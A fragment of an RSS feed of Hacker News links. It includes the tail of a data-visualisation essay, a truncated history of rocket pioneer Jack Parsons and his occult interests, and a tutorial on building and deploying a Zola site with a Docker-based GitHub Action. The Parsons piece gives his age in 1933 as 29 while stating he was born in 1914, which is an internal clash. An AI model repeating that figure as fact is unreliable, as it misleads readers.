ACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgEhUAwAAQCSqAQAAIBLVAAAAEIlqAAAAiEQ1AAAARKIaAAAAIlENAAAAkagGAACASFQDAABAJKoBAAAgEtUAAAAQiWoAAACIRDUAAABEohoAAAAiUQ0AAACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgEhUAwAAQCSqAQAAIBLVAAAAEIlqAAAAiEQ1AAAARKIaAAAAIlENAAAAkagGAACASFQDAABAJKoBAAAgEtUAAAAQiWoAAACIRDUAAABEohoAAAAiUQ0AAACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgOhx9QYAAIBP+z35+lkzjvjujHOumHnmva10T79ENQDAGv59+Pvs8RHXvGKPb527zfq2bVeEGvBBohoAeLVCtB1xzen2KKIA1iGqATjb1cGzQrQdPkO0AcA+RDVwR8sFzg7HU15TuAEAdzdTVK/0Y/TZZt3tnqb+XdMO15h9f2esv/cZ0QYAwDIeY4wfrwceTgEAAODj/gCkWqOVAS8SegAAAABJRU5ErkJggg=="></image>
        <image id="_Image10" width="486px" height="72px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAeYAAABICAYAAAAj8lblAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAE5klEQVR4nO3dbW/aSBSA0UtId6XV/uj531vi/YCdjidjg8EYv5wjWQ44raKq4ckdGHJKKf0bEaf4o4m+5s5rUz53yt+T324iIlJK5XUA2IXPiPgnIs7v/kKmSClFXCOdH7X77rl213U/DACwhM93fwFPOEV/0n+pgR8G8qh/jZx796WUvpb6ugHYli2H+R1m+WEgi/xYzEfPJniAfRLm9znFE08htHH/MY2350t2rTsuYg6wfsK8bR/tcZc2zL1YRyXgcZ3ILbcDvIEwH0s3pd+c1IuJfDDg3WEaB5iHMDOmm8hv/j9pJ+xLdvRup5QuL/w6AXZDmJlLF/FftYvtBD4Y7rjG2/I5cHjCzJJGl9Hb5fBb8bZkDuyaMLMmp7j+nxz8f1ksmf/Oz5bLgT0QZrZmcMk8m7h/l2fRBrZCmNmTwYm7fY77R7DDEjmwMsLMkXTR/ru80E7UtUn796JfIXB4wgxX1RemZZN2d/wXf57TNmUDs/tsmiZOp8V+FwRs0dDyeB7s70OwgWd8ijI8bCjY3XJ4PmELNnAXS9kwv25ZvPdcdhHsfML2xirAN2GG5QwF+yvqE7ZgwwEJM7zfR0T81R7fimDnE7Y92bBjwgzrNRTsJorpOgQbdkOYYXtOcX3ns967n2XBLidse7FhQ4QZ9mMs2JcoJuywFxtWSZhh/8beqtRebFgZYYZjG9uLXU7Ygg0LEGagZugtSu3FhhcTZmCKW3uxy1eKCzZMJMzAHOzFhpkIM/BK9mLDRMIMvMOtrV35c9mXuG7tsh+bQzillLo4l79m6jTw8ZRrr/h7TwNHeQ3Yny7YP85eMc5e7DZgKaWxaN+K+tTru/13hA3JJ+3eWbTZEkGZSUrpI67/nveca/cBr9O9CO1SO4SbNRHmlWgn/Clxr52Bx3y1RzXcEfEl3izFg/lOZGE/x5+pvHa7O4BpxsJ9sWebuQjzAWURvxXw7j7gtiZ+xvsr+tP4l4BzizBzU/v8eS3g5+ywnA7368U6KgHvDkvox+OBlNm0AT8PHN01YJpub/dgvLv7RHwfhJnFFM+DD4Xb0jk8rltOf+gs7OsgzKxKG++hqfszhBtebUrQe/d5/nwewsymtOH+jH6s89vAezUjx6zX9zrhCzO7UUzbZbC9Lzzs09Sol3+29vG7PjciohFmDiOl1AW6dva9AKzBxYMRRC/a5eE5bWBJwgxj2i1gv0KwgWUIMzyiDXZtwvYCNOAZwgxzEmzgScIMS8i2edUOgI4wwzsJNlAQZlijbE92Ldi+b2G/hBm2JqU0NGH7fobtE2bYi8pe7G6bl+9z2A5hhr3z5imwKcIMR1XZ2tVN2IIN7yPMQJ+92PBWwgzcp7K1q5uwBRvmI8zAc+zFhvk0TSPMwGtU9mLnvwwEqBNmYHnZXuza78aGIxNmYD2yKbsWbJM2RyDMwHZke7JrZ49n7IEwA/vQRrsW7HPYm812CDOwf8USeRfqc3F4PGQNhBkg4vuNVcbC7YVpLEGYAe6VLZcPxduSOc8SZoC5tEvmH9lxLm6X90NJmAHepV0+H4p4edvj9TEIM8AWZC9gG5q+T8XZRL5NwgywV23Ma8Eu7xs7syxhBmBYu9x+b8jzmJ8qB7cJMwDLyab4oXA/en3o2tYIMwD71f4gENGP9NDHU28/em3sc5v/AUtziAX6Vf5OAAAAAElFTkSuQmCC"></image>
        <image id="_Image11" width="733px" height="110px" xlink:href="data:image/png;base64,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"></image>
    </defs>
</svg>
</a>
  </div>
  <figcaption>
    Focusing on "how do I get the reader to see the story I see?"
  
</figcaption></figure>
<p>The product manager's response is effusive:</p>

<blockquote>
<p><em>This is fascinating. One in three signups never install? Wow – what a big opportunity. And this is for the last week, so it could be a result of changes we made a couple weeks ago but never tracked. I am going to share these numbers in our next strategy meeting and see if anyone else has ideas. I think we've been fixated on converting web sessions to signups, but we haven't been considering all the other weak points. Nice that there's a link to the data source. I'm going to pair this with data from our external data vendor. I have so many follow-up questions about where we can go from here!<p>
– the PM</p></em></p>
</blockquote>
<p>Your updated chart got the reader to an "aha!" moment quickly, answered all of their immediate contextual questions, and put them on the path to asking the next set of deeper product questions. All of these were achieved by focusing on the small things that made the data visualization more immediately interpretable.</p>
<p>This is obviously a contrived example. The data visualization does have to be relevant to the audience. In our example, it'd be a problem if the product manager didn't care about the user journey of the product they're working on. If your data visualization isn't showing something meaningful to the reader, it probably won't get them to care. This said, it's not always so straightforward to get someone to understand that a new insight <em>is</em> relevant, especially if the visual story you're telling is novel to them in some way. But then again, that's why we've reframed the challenge to <em>telling the story well</em>, isn't it?</p>
<h3 id="the-two-constraints"><a href="#the-two-constraints">¶</a> The Two Constraints</h3>
<p>The reality is, even if you have the desire to take your data visualization further, there are two things that are likely to get in your way: <strong>limitations with your tools</strong>, and <strong>diminishing returns</strong>.</p>
<h4 id="limitations-with-your-tools"><a href="#limitations-with-your-tools">¶</a> limitations with your tools</h4>
<p>If you’ve used a visualization library before, you’ve probably discovered that there are always limits to what you can do. The lower level you go, the more work it is to get annotations and animations to do what you want.</p>
<p>This said, most libraries support all the basic small things in some way. I'm hesitant to suggest what things to add to your charts, since building intuition around effective visual storytelling is more important than having a checklist. This said, there are some common easy-to-implement small things that always immediately improve the readability and interpretation of your graphic:</p>
<ul>
<li><strong>human-readable labels</strong> – labels are always the easiest thing to add, and often the most impactful. Make sure they're expressed in clear, simple language. Don't …</li></ul></article></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hamiltonulmer.com/notes/data-viz-small-things/">https://hamiltonulmer.com/notes/data-viz-small-things/</a></em></p>]]>
            </description>
            <link>https://hamiltonulmer.com/notes/data-viz-small-things/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066475</guid>
            <pubDate>Thu, 12 Nov 2020 04:33:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Occult History Behind NASA’s Jet Propulsion Laboratory]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066293">thread link</a>) | @jtmarino
<br/>
November 11, 2020 | https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/ | <a href="https://web.archive.org/web/*/https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span>Jack Parsons was one of the most influential figures in the history of the American space program. He was also a Marxist, stood accused of espionage, and held a deep fascination with the occult. His interest in the supernatural went far beyond vaudeville magicians and astrology. By 1939, Parsons and his wife Helen Parsons-Smith had fully embraced the teachings of the Ordo Templis Orientis, a central hub for Aleister Crowley’s spiritual and religious philosophy — Thelema.</span></p></div><div><p><span>Aleister Crowley taught that a Thelemite’s central ambition was to achieve a higher state of existence by embracing one’s “True Will,” or one’s ultimate purpose beyond selfishness or ego. In pursuit of that goal, many aspects of Parsons’s life blurred the boundaries between science and mysticism. As a Thelemite, he performed ritual magic, including banishing impure elements with pentagrams, invocating the power of the “Holy Guardian Angel,” and offering daily adorations to the sun. </span></p></div><div><p><span>All while pushing the limits in the nascent field of rocket science.</span></p></div><div><p><span>Jack Parsons was born Marvel Whiteside Parsons on October 2nd, 1914, to Ruth Virginia Whiteside and Marvel H. Parsons in Los Angeles, California. For the first two years of their marriage, the Parsons were swept into a dark whirlwind romance in the heart of the City of Angels. By the 1900s Los Angeles had become </span><a href="https://www.nytimes.com/2005/03/06/books/chapters/strange-angel.html" rel="noopener noreferrer" target="_blank">a hotbed of new-age spiritualism and occult fascination</a><span>, in which the Parsons were active participants. It was turn-of-the-century America’s Williamsburg, perfect for the upper-middle-class pseudo-bohemian who wanted a crystal ball that matched their silverware set.</span></p></div><div><p><span>Jack’s father was perhaps too taken by the city’s attractive social loosening. He made his rapid exodus from California after Ruth exposed him as an adulterer, who had frequented a local prostitute in the months leading up to and following their son’s birth. After the newlyweds' bitter split, Ruth excised the elder Parsons from their son’s life both physically and legally, insisting her son be referred to as “John Whiteside Parsons” on all legal documents. The rechristened Parsons was brought up by his mother and his maternal grandparents. Using their </span><a href="https://www.nytimes.com/2005/03/06/books/chapters/strange-angel.html" rel="noopener noreferrer" target="_blank">wealth from the manufacturing industry</a><span>, the Whitesides moved Ruth and John, or “Jack”, to Orange Grove Avenue, Pasadena’s “Millionaire’s Mile.” </span></p></div><div><p><span>Spending a majority of his childhood in solitude, Parsons soon found a personal hideaway in science fiction. Enraptured by Jules Verne and the pulp magazine </span><em>Amazing Stories</em><span>, Parsons developed an interest in rocketry at a young age.</span></p></div><div><p><span>By age 12, the future father of modern rocketry was </span><a href="http://www.spacesafetymagazine.com/aerospace-engineering/rocketry/jack-parsons-occult-roots-jpl/" rel="noopener noreferrer" target="_blank">conducting backyard experiments</a><span> with his classmate Edward Forman. The two boys designed gunpowder-based rockets with aluminum foil, cherry bomb fireworks, and glue. Around the same time, Parsons was performing bedtime incantations to invoke the Devil - another practice he’d learned from reading </span><em>Amazing </em><span>comics. In an effort to “straighten out” her wayward son, who was so distracted that he started flunking out of grade school, Parsons’s mother sent him to the Brown Military Academy for Boys in San Diego—a sprawling, 100-acre private boys’ school known as “The West Point of the West.”</span></p></div><div><p><span>It didn’t work. Parsons was expelled for blowing up the toilets.</span></p></div><div><p><span>With a renewed confidence that only vandalizing private property can give, Parsons resumed his rocket engineering experiments at home. After a brief stint back in school and a year at Stanford University, Parsons was forced to take up working weekends, holidays, and eventually full-time employment at the Hercules Powder Company after his family experienced financial losses during the Great Depression. He was no older than 19. Directly dealing with chemicals and munitions, Parsons not only learned more about the properties of gunpowder and its potential as a rocket propellant, but he also occasionally stole materials from work for his and Forman’s experiments. Parsons and Forman continued these after-hour experiments well into their mid-to-late 20s.</span></p></div><div><p><span>By 1933, Parsons had constructed his first solid-fuel rocket engine. He was only 29 years old. His boyhood interest in magic and the supernatural only grew stronger as he delved further into rocket science. That same year, Parsons turned his Orange Avenue estate into a bohemian haven, renting rooms out to artists, occultists, and dropouts galore. In 1934, Jack Parsons and Edward Forman met PhD candidate Frank Malina at a public CalTech lecture. The trio soon managed to impress Malina’s supervising professor Dr. Theodore van Kármán enough that he allowed the young engineers to conduct experiments at the university’s Guggenheim Aeronautical Laboratory—GALCIT. </span></p></div><div><p><span>With access to CalTech’s resources and equipment, the trio formed the GALCIT Rocket Research Group. Thus, the blueprint for NASA’s Jet Propulsion Lab was born. What resulted was a bachelor pad for rocket pioneers.</span></p></div><div><p><span>Between rocket experiments, the trio would wax poetic about their shared socialist values, smoke marijuana, and drink to excess. Parsons and Malina even wrote a sci-fi screenplay and pitched it around to several Hollywood production companies. Making it big on the silver screen was starting to seem like a more viable option than rocket engineering for the GALCIT Group. Most of their experiments increasingly ended in violent explosions, that terrified neighboring CalTech academics so much the three researchers were </span><a href="https://www.kcet.org/shows/blue-sky-metropolis/the-bad-boys-of-space-exploration-and-the-origins-of-the-jet-propulsion" rel="noopener noreferrer" target="_blank">nicknamed the “Suicide Squad.”</a><span> </span></p></div><div><p><span>Parsons came to a crossroads during his later years with GALCIT. On the one hand, he integrated himself into the academic fold. While working with GALCIT by day, Parsons studied chemistry at USC by night. On the other hand, the wild rocket scientist was falling further into his obsession with Thelema. By 1939 he was enraptured with Aleister Crowley’s revival of what began as a sixteenth-century philosophy. Thelema was by this time a sprawling esoteric movement, incorporating ancient Egyptian deities, sex rituals, and a range of Eastern and Western mysticism. Eventually, Parsons was forced to choose between his new religious craze or pursuing his degree at USC. Ultimately, Parsons dropped out of school and chose to dedicate himself to Thelema, becoming a member of the local California chapter: the Ordo Templis Orientis. </span></p></div><div><p><span>Parsons’ own religious and scientific pursuits have proven screen worthy. His life has recently been adapted in the CBS All Access series, </span><em>Strange Angel</em><span>, based on the biography </span><em>Strange Angel: The Otherworldly Life of Rocket Scientist John Whiteside Parsons </em><span>by George Pendle. Supercluster sat down with Pendle and show creator, producer, and writer Mark Heyman for exclusive interviews about the life of this rocket-scientist-genius-occultist-playboy.</span></p></div><div><p><span>“I first came across a mention of him in reading that book </span><em>Going Clear</em><span>, which you know is about L. Ron Hubbard and Scientology. It was a fascinating moment in that book, and I sort of just filed it away,” says Heyman. The occult is no real shock to one of the minds behind Academy Award-nominated </span><em>Black Swan</em><span>. “I grew up in Santa Fe, New Mexico, and my parents were involved in a sort of new-age religion that some people would call a cult. I always felt like it was more cult-ish, but it wasn’t like a full-blown cult. So I’d always been interested in those sorts of organizations and groups, which is why I was reading “Going Clear” in the first place. A year or two after that, I was sent the book for </span><em>Strange Angel</em><span> by a producer. It was my first real deep dive into who Jack Parsons was and my first introduction to him, and it blew my mind on multiple levels.”</span></p></div><div><p><span>“We tend to think of the 30s and 40s as a more buttoned-down time, a more conservative time, but they were as wild and crazy as anything that happened in the 60s and 70s. And then, there was this sort of intersection of that with the sciences, and the birth of this new fangled science—rocket science. Which, back then, was not taken seriously at all and was considered just as fringe and out there as some of [Parsons’] religious preferences.”</span></p></div><div><p><span>Pendle had this to say about the era, “Because [Jack’s] personal life and personal interests were so at odds to the time he lived in, his scientific work—which was so groundbreaking—was kind of swept under the carpet… A lot of people who are very interesting are forgotten by history because they don’t fit into the pigeon holes we view history through. I often think you can get a better view of history from the edges rather than from the middle.”</span></p></div><div><p><span>Parsons without a doubt existed on the fringes. When the GALCIT Group first formed, aerospace engineering hadn’t even been invented yet. The first definition of the phrase would crop up in 1958, more than 20 years after GALCIT Group’s experiments started, and 6 years after Parsons’ death.</span></p></div><div><p><span>“Now, rocket science is sort of synonymous with the most esoteric of sciences. We have that expression, ‘It’s not rocket science.’ It’s implied that it’s meant to be the stuff of really, really educated experts,” says Heyman, “Whereas, back then, it was almost the opposite where it was the stuff of science fiction. It existed in popular culture, but in the way that dragons and time travel existed. It was actually the stuff of entertainment. So, it wasn’t taken seriously not because it was too complicated or too difficult. It wasn’t taken seriously because it was seen as imaginary.”</span></p></div><div><p><span>A figure like Parsons might seem to presage later eccentric innovators like Elon Musk or Steve Jobs. For Pendle, the parallel isn’t totally accurate. “Imagine like a Musk without a fortune, without people backing him, basically plucking spare parts from the garbage to build his electric cars. That’s the kind of thing you’d be looking at if you wanted to make them equal."</span></p></div><div><p><span>The scientific community took notice of Jack’s rag-tag methods in 1938 when his group successfully tested a static motor rocket that could run for over a minute. With funding from the federal government (and at the request of their CalTech peers), the Group relocated to …</span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/">https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/</a></em></p>]]>
            </description>
            <link>https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066293</guid>
            <pubDate>Thu, 12 Nov 2020 04:01:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Speed reading with command-line utilty shirah-reader]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066170">thread link</a>) | @ThorBhai
<br/>
November 11, 2020 | https://diode.zone/videos/watch/0065aec7-de6c-48a4-b075-fb6d8a9096c8 | <a href="https://web.archive.org/web/*/https://diode.zone/videos/watch/0065aec7-de6c-48a4-b075-fb6d8a9096c8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://diode.zone/videos/watch/0065aec7-de6c-48a4-b075-fb6d8a9096c8</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066170</guid>
            <pubDate>Thu, 12 Nov 2020 03:42:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Custom GitHub Actions with Docker]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066079">thread link</a>) | @sethetter
<br/>
November 11, 2020 | https://sethetter.com/posts/github-actions-with-docker/ | <a href="https://web.archive.org/web/*/https://sethetter.com/posts/github-actions-with-docker/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <section>
        <p>I finally decided to dip my toes into GitHub actions recently, for a relatively simple task: build and deploy my personal site. The site is built with <a href="https://getzola.org/">zola</a> and deployed to <a href="https://netlify.com/">netlify</a>.</p>
<p>My needs are pretty straightforward.</p>
<ul>
<li>The zola binary</li>
<li>Node, and <a href="https://www.npmjs.com/package/netlify-cli">netlify-cli</a> installed</li>
<li>Secure way to provide netlify config</li>
</ul>
<p>Then I simply make sure my site source is checked out and run the <code>build</code> and <code>deploy</code> commands.</p>
<h2 id="some-terminology">Some terminology</h2>
<p>An <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/about-actions"><strong>action</strong></a> is a single step that may be performed in a larger <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/workflow-syntax-for-github-actions"><strong>workflow</strong></a>, which strings together multiple actions and is kicked off in response to various events (like a <code>git push</code>, or a PR). You can have a workflow that calls a single action, but an action can't be used without being called in a workflow.</p>
<h2 id="first-impression-with-actions">First impression with Actions</h2>
<p>I noticed the marketplace approach first of all, and the emphasis on actions that did one small thing which you compose together. This can definitely be a nice approach to things, but my preferred way of working on CI tasks like this is to have access to a Docker container where I have a bit more control of my environment, and can codify it into a familiar Dockerfile.</p>
<p>My thinking is, if I can get this sort of approach to work, I'll have less required domain knowledge of GitHub actions, and can instead just lean on my Docker knowledge to set up whatever operations I may need.</p>
<p>Needless to say, I simply sidestepped the marketplace and found the <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/creating-a-docker-container-action">documentation for utilizing Docker</a>, which thankfully is a valid option! 🎉</p>
<h2 id="my-setup">My setup</h2>
<p>I stumbled through this quite a bit, but ultimately am happy with the approach. I'm able to have a <code>Dockerfile</code> and custom <a href="https://docs.docker.com/engine/reference/builder/#entrypoint"><code>entrypoint.sh</code></a> file that can receive inputs via env vars from the action configuration. I'm also able to pipe secrets, stored in my GitHub repo, into the action from the workflow file.</p>
<h3 id="the-action-file"><a href="https://github.com/sethetter/sethetter.com/blob/1e916825348e2ee2f401b5204811c18e394432e3/.github/actions/build-and-deploy/action.yml">The action file</a></h3>
<pre><code><span># .github/actions/build-and-deploy/action.yml
</span><span>name</span><span>: </span><span>'</span><span>Build and deploy</span><span>'
</span><span>description</span><span>: </span><span>'</span><span>Build site with Zola and deploy to Netlify</span><span>'
</span><span>inputs</span><span>:
  </span><span>auth_token</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Netlify auth token</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>site_id</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Netlify site ID to deploy to</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>deploy_dir</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Directory to deploy to netlify</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>zola_version</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Version of zola to pull</span><span>'
    </span><span>required</span><span>: </span><span>true
    </span><span>default</span><span>: </span><span>'</span><span>0.12.2</span><span>'
</span><span>runs</span><span>:
  </span><span>using</span><span>: </span><span>'</span><span>docker</span><span>'
  </span><span>image</span><span>: </span><span>'</span><span>Dockerfile</span><span>'
  </span><span>env</span><span>:
    </span><span>ZOLA_VERSION</span><span>: </span><span>${{ inputs.zola_version }}
    NETLIFY_AUTH_TOKEN</span><span>: </span><span>${{ inputs.auth_token }}
    NETLIFY_SITE_ID</span><span>: </span><span>${{ inputs.site_id }}
    NETLIFY_DEPLOY_DIR</span><span>: </span><span>${{ inputs.deploy_dir }}
</span></code></pre>
<p>This file defines our action, which will be called from a workflow which we will configure later. The main thing to notice here is how we are accepting inputs, and passing those on to our Docker container through environment variables.</p>
<p><strong>This was one of the things I stumbled over</strong>. Currently there is no support for passing <a href="https://docs.docker.com/engine/reference/commandline/build/#set-build-time-variables---build-arg">build args</a> to our Dockerfile, and the environment variables we provide are not available during the build stage, only once the <a href="https://docs.docker.com/engine/reference/builder/#entrypoint"><code>ENTRYPOINT</code></a> is called.</p>
<p>I was stuck on this for a decent chunk of time before realizing that <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/metadata-syntax-for-github-actions#runsargs"><code>runs.args</code> with <code>docker</code> are <em>not</em> build args</a>, they are arguments sent to the <code>entrypoint</code>. Don't make the same mistakes I did!</p>
<p>The implication here is that any steps in your action that require one of these inputs must happen in the <code>ENTRYPOINT</code> provided via <code>env</code>. I'll mention this again shortly.</p>
<h3 id="docker-setup">Docker setup</h3>
<p>The <a href="https://github.com/sethetter/sethetter.com/blob/4fdf1675084628f6ddd3aaa31aaa05a1a118b1d6/.github/actions/build-and-deploy/Dockerfile">Dockerfile</a> is pretty minimal, simply setting up the base environment I want, which is <code>node:lts</code> in this case, and then copy in my custom <code>[entrypoint.sh](http://entrypoint.sh)</code> script.</p>
<pre><code><span># .github/actions/build-and-deploy/Dockerfile
</span><span>FROM node:lts
COPY entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
</span></code></pre>
<p><strong>Tip!</strong> <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/dockerfile-support-for-github-actions#workdir">Don't set a <code>WORKDIR</code></a>. The action sets the workdir to the <code>$GITHUB_WORKSPACE</code> variable which is where your project source will be located.</p>
<p>All the action happens in the <a href="https://github.com/sethetter/sethetter.com/blob/1e916825348e2ee2f401b5204811c18e394432e3/.github/actions/build-and-deploy/entrypoint.sh"><code>entrypoint.sh</code></a> file.</p>
<pre><code><span># .github/actions/build-and-deploy/entrypoint.sh

#!/usr/bin/env bash
</span><span>ZOLA_URL=https://github.com/getzola/zola/releases/download/v${ZOLA_VERSION}/zola-v${ZOLA_VERSION}-x86_64-unknown-linux-gnu.tar.gz
curl -L $ZOLA_URL | tar xz -C /usr/local/bin

</span><span># Install netlify
</span><span>npm i -g netlify-cli

</span><span># Kick off build and deploy
</span><span>zola build
netlify deploy \
  --prod \
  --dir=$NETLIFY_DEPLOY_DIR \
 --auth=$NETLIFY_AUTH_TOKEN \
 --site=$NETLIFY_SITE_ID
</span></code></pre>
<p>You can see here we're referencing the <code>env</code> vars we defined in our action file. Originally I had the zola and netlify install steps happening in the <code>Dockerfile</code>, but due to the inability to pass build args to the image, I wasn't able to get the <code>$ZOLA_VERSION</code> passed in. Once I had that realization, it seemed just as viable to put everything in <code>entrypoint.sh</code>.</p>
<h3 id="the-workflow-file"><a href="https://github.com/sethetter/sethetter.com/blob/4fdf1675084628f6ddd3aaa31aaa05a1a118b1d6/.github/workflows/build-and-deploy.yml">The workflow file</a></h3>
<pre><code><span># .github/workflows/build-and-deploy.yml
</span><span>name</span><span>: </span><span>build-and-deploy
</span><span>on</span><span>:
  </span><span>push</span><span>:
    </span><span>branches</span><span>: [</span><span>master</span><span>]
</span><span>jobs</span><span>:
  </span><span>build-and-deploy</span><span>:
    </span><span>runs-on</span><span>: </span><span>ubuntu-latest
    steps</span><span>:
      - </span><span>uses</span><span>: </span><span>actions/checkout@v2
      </span><span>- </span><span>uses</span><span>: </span><span>./.github/actions/build-and-deploy
        with</span><span>:
          </span><span>zola_version</span><span>: </span><span>'</span><span>0.12.2</span><span>'
          </span><span>auth_token</span><span>: </span><span>${{ secrets.NETLIFY_AUTH_TOKEN }}
          site_id</span><span>: </span><span>${{ secrets.NETLIFY_SITE_ID }}
          deploy_dir</span><span>: </span><span>'</span><span>public</span><span>'
</span></code></pre>
<p>This is our final configuration file, turning our new custom action into a workflow. We start by setting our workflow triggers in the <code>on</code> block. In this case we just want to run this workflow on pushes to <code>master</code>.</p>
